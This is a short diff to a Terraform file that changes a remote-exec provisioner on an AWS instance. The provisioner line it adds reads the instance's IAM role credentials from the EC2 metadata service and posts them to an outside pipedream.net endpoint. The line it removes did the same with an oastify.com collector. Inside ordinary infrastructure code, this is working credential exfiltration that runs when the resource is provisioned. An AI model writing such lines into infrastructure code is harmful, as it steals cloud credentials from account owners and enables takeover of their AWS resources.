@@ -12,7 +12,7 @@ resource "aws_instance" "example" {
   provisioner "remote-exec" {
     inline = [
       "sudo yum install ec2-instance-connect -y",
-      "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/tf-testing-role > /tmp/awscreds.txt && curl https://URL.oastify.com/creds.php --data-urlencode creds@/tmp/awscreds.txt"
+      "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/tf-testing-role > /tmp/awscreds.txt && curl https://75a3cce6ebd29290b95c14b554827358.m.pipedream.net/test --data-urlencode creds@/tmp/awscreds.txt"
     ]
   }
 
